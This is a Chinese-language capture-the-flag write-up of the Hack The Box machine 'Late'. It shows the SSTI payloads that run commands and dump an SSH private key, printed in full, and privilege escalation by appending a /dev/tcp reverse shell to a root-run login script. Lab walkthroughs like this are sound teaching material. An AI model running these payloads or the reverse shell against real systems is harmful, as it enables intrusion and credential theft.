# 服务探测

```
┌──(root💀kali)-[~/htb]
└─# nmap -p- --open 10.10.11.156 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 22:51 EDT
Nmap scan report for 10.10.11.156
Host is up (0.27s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 126.65 seconds
                                                                                                                    
┌──(root💀kali)-[~/htb]
└─# nmap -sV -Pn -A -O 10.10.11.156 -p 22,80      
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-29 22:53 EDT
Nmap scan report for 10.10.11.156
Host is up (0.49s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   486.69 ms 10.10.16.1
2   243.78 ms 10.10.11.156

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.65 seconds

```

# web

80端口打开是两个静态页面

在底部页面找到一个邮件账号：```support@late.htb```

存在一个late.htb的域名，添加到host文件

## vhost爆破

```
┌──(root㉿rock)-[~]
└─# gobuster vhost -u late.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 100
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://late.htb
[+] Method:       GET
[+] Threads:      100
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/09/30 11:18:34 Starting gobuster in VHOST enumeration mode
===============================================================
Found: images.late.htb (Status: 200) [Size: 2187]
                                                 
===============================================================
2022/09/30 11:20:05 Finished
===============================================================

```

出来一个 ```images.late.htb```域名，加到host文件

这个站点可以把上传的图片里的文字扫描出一个txt输出

## SSTI

准备一张图片，内容如下:

```
{{7*7}}
```

上传完成以后输出为：
```
<p>49
</p>
```

证明存在[SSTI(Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

截图下面命令进行注入：

（注意：```.read()```之前有一个空格）

```

{{ cycler.__init__.__globals__.os.popen('id') .read() }}

```


输出
```
<p>uid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)

</p>
```


下面命令返回一个ssh秘钥文件(这里试了好久..)
```


       
     {{ cycler.__init__.__globals__.os.popen(" cat /home/svc_acc/.ssh/id_rsa ") .read() }}


```

返回

```
<p>-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----

</p>
```

拿到初始shell
```
┌──(root💀kali)-[~/htb/late]
└─# ssh -i id_rsa svc_acc@10.10.11.156                   
The authenticity of host '10.10.11.156 (10.10.11.156)' can't be established.
RSA key fingerprint is SHA256:E2YWHVFBETYjBCFqBT19Ku0JwcmcqVUAzxnT+e1e2Ms.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.156' (RSA) to the list of known hosts.
svc_acc@late:~$ whoami
svc_acc
svc_acc@late:~$ ls
app  user.txt
svc_acc@late:~$ cat user.txt
b11ed2e2b80179f7...

```

# 提权


linpeas枚举到一个脚本
```
svc_acc@late:/usr/local/sbin$ cat ssh-alert.sh
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi

```

看起来是ssh登录的时候会触发这个脚本

不可以直接写shell进这个脚本，但是可以通过这种方式写进去

```
svc_acc@late:/usr/local/sbin$ echo "bash -i >& /dev/tcp/10.10.16.3/443 0>&1" > 1.txt
svc_acc@late:/usr/local/sbin$ cat 1.txt 
bash -i >& /dev/tcp/10.10.16.3/443 0>&1
svc_acc@late:/usr/local/sbin$ cat 1.txt >> ssh-alert.sh
svc_acc@late:/usr/local/sbin$ cat ssh-alert.sh 
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi


bash -i >& /dev/tcp/10.10.16.3/443 0>&1

```

拿到root  flag
```
┌──(root💀kali)-[~/htb/late]
└─# nc -lnvp 443                                                                                           1 ⨯
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.11.156] 57212
bash: cannot set terminal process group (14151): Inappropriate ioctl for device
bash: no job control in this shell
root@late:/# cd /root
cd /root
root@late:/root# ls
ls
root.txt
scripts
root@late:/root# cat root.txt
cat root.txt
1fed2702ad7571f1d..

```